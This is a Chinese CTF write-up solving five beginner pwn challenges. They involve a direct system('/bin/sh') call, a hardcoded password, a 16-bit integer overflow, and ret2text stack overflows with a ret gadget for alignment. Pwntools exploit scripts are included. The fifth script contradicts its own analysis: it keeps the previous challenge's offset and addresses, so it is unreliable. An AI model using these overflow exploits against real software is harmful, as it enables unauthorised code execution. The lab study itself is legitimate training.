<h1 id="Wz0mh">**题一**</h1>
先用checksec对附件test进行检查，可以从图中看出这是64为的程序

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699598333-5c04f52a-6864-44ee-ace8-0c91b17cd361.png)

接下来，打开IDA，找到main函数，反编译，查看源代码

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699598508-572ffc1a-8965-4d95-a645-9fd34e2db7b5.png)

从图上可以得到，main函数中直接调用system("/bin/sh")

所以直接nc连接，这样就拿到shell了

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699598686-412df611-89fb-43b2-9803-574dcd3528aa.png)

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699598935-92fd9581-de2f-49ee-b9ce-99fe156496d0.png)

<h1 id="N0dlB">**题二**</h1>
还是先用checksec检查附件，是64为的程序

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699599226-4bb5b388-b9d8-48f4-bd59-352ee5398cd5.png)

使用IDA，找到main函数，查看源代码

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699599524-e8f33dc1-5d6f-415a-bec9-57e77877b6ab.png)

从图中可以看出，我们需要输入整数，当n7038329==7038329时，就执行system("/bin/sh")，直接拿到shell

直接nc

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699599752-d50bc86e-bb25-46d5-ac28-13e848205291.png)

可以看到要输入密码，所以我们直接输入7038329

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699599918-17aa5055-8bec-43c4-8f34-39620bee807d.png)

直接拿到了shell，然后就可以直接打开flag

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760699600121-cd71ae6b-8c1f-4bca-84d0-e59c869fc706.png)

<h1 id="pdExQ">**题三**</h1>
先用checksec对附件INTbug进行检查，可以从图中看出这是64为的程序

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760713047659-47655cff-4d2e-4af9-8baa-449340cfc717.png)

接下来，打开IDA，找到main函数，反编译，查看源代码，可以发现在main主函数下还有一个func的子函数，查看func函数

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760712411902-7e247582-cb06-4748-be2a-0a041f2902a0.png)

函数中，v1被定义为16位有符号整数，它的范围在-32768~32767，从函数中，可以发现当++v1<0时，就能执行if语句了，也就是可以得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760712467788-54ca3da0-d002-49d3-ac7d-562d0ceb0f66.png)

最初v1=0，每输入一个正数的v2，v1自增一次，当v1从32767再自增，会触发整数溢出，<font style="color:rgba(0, 0, 0, 0.85);">数值环绕为-32768，此时就满足++v1的条件，所以要输入32768次正数，让v1触发整数溢出。</font>

<font style="color:rgba(0, 0, 0, 0.85);">编写一个循环32768次向靶机发送数据"1"，使v1自增到32767后触发整数溢出的攻击脚本</font>

```python
from pwn import *
context(arch = 'amd64',os = 'linux', log_level = 'debug')
p = remote("8.147.132.32",34887)
for _ in range(32768):
    p.sendline(b"1")
p.interactive()
```

python3执行，就得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760715265900-a022ffc9-1573-45e8-8aff-f8d2d30f9c47.png)

<h1 id="VNFkW">题四</h1>
先用checksec对附件ret2text2进行检查，可以从图中看出这是64为的程序

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760764753670-c0f41e9a-f03d-4348-9064-5d66d196bed9.png)

IDA

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760796598074-68902b7b-5bc6-4d34-85c9-5f186d8d69d2.png)

在vuln函数中，buf仅能容纳256（0x100）个字节，但是read函数中试图读取320（0x140）个字节，所以就有可能发生缓冲区溢出，可以利用缓冲区溢出，将后门函数的地址覆盖在返回地址上面，让程序执行后门函数，这样就拿到shell

![后门函数地址](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760796724747-44cc70d5-3b8e-4420-8d2b-55a9e613f12d.png)

buf距离rbp有0x100个字节，在缓冲区后面是栈帧指针rbp（8个字节）然后是返回地址，可以写入0x108个字节的垃圾数据，再写入后门函数backdoor的地址，这样后门函数backdoor的地址就覆盖了返回地址，这样就应该可以拿到shell

```python
from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")
p = process("./ret2text2")
backdoor = 0x4011CA
payload = b'A'*0x108+p64(backdoor)
p.sendline(payload)
p.interactive()
```

没有拿到shell，有错误

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760764917769-5fa88b5a-13f4-4d00-88b2-c10d02b9a61f.png)

从图上的信息可知，64位程序的堆栈平衡问题未解决，触发了EOF

在64位系统中，函数调用要求栈指针（rsp）保持16字节对齐。程序在调用vuln函数前会先将函数的地址（8个字节）进栈，这样就会导致rsp未满足对齐要求，导致后续backdoor函数执行崩溃。

<h2 id="WCIBP">解决方法</h2>
将vuln函数的返回地址弹出栈并跳转到该地址继续执行，这样栈指针就回到了16字节对齐的状态。要用到ret指令

<h3 id="cnOC0"> ret  指令的核心操作</h3>
> ret指令的核心操作：
>
> 弹出返回地址：从当前栈顶（rsp 指向的位置）读取 8 字节的返回地址，这是之前call 指令压栈保存的“函数执行完要回到的位置”。
>
> 更新 rsp：读取地址后，栈顶向上移动 8 字节（因为弹出了 8 字节数据），所以rsp的数值会增加 8（栈向上收缩，弹出数据后栈顶地址升高）。
>

<h3 id="ckeRx">查看ret指令的地址</h3>
用ROPgadget快速查找

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760799183839-72ac6a98-1a68-4992-8e04-299b323e81ee.png)

在栈溢出后，先执行 ret指令，rsp增加 8 变为 0x100 ，刚好满足 16 字节对齐；再跳转到  backdoor  函数，此时 rsp 已对齐，函数能正常执行，不会崩溃。

```python
from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")
p = process("./ret2text2")
backdoor = 0x4011CA
ret = 0x40101a
payload = b'A'*0x108+p64(ret)+p64(backdoor)
p.sendline(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760799055609-312c4345-69d5-4851-9573-605004dda06a.png)

<h1 id="myohO">题五</h1>
checksec对附件ret2text2进行检查

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760800361959-ec75ed46-77e8-40be-87be-d9c45d5a525a.png)

ida

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760801054557-060f7aca-70d2-42c2-8eb9-6afe80969643.png)

在该函数中有gets函数，gets函数无长度限制，所以就会有缓冲区溢出，这里v1是0x20个字节，加上栈帧指针的8个字节，就是v1距离rbp0x28个字节，可以写入0x28字节的垃圾数据，再写入后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760801499850-fd122d43-d1cf-4032-af8a-16a0f4fd6286.png)

execve函数是系统调用函数，可以替换当前进程的代码段、数据段和堆栈段，在这里也是后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760801880952-79788489-247e-4f0a-8333-36ebbb0eadff.png)

```python
from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")
p = process("./ret2text2")
fun = 0x4011CA
ret = 0x40101a
payload = b'A'*0x108+p64(ret)+p64(fun)
p.sendline(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2025/png/58912184/1760802201067-a3f5f194-b1e5-4cd9-99fc-87557a7a647b.png)

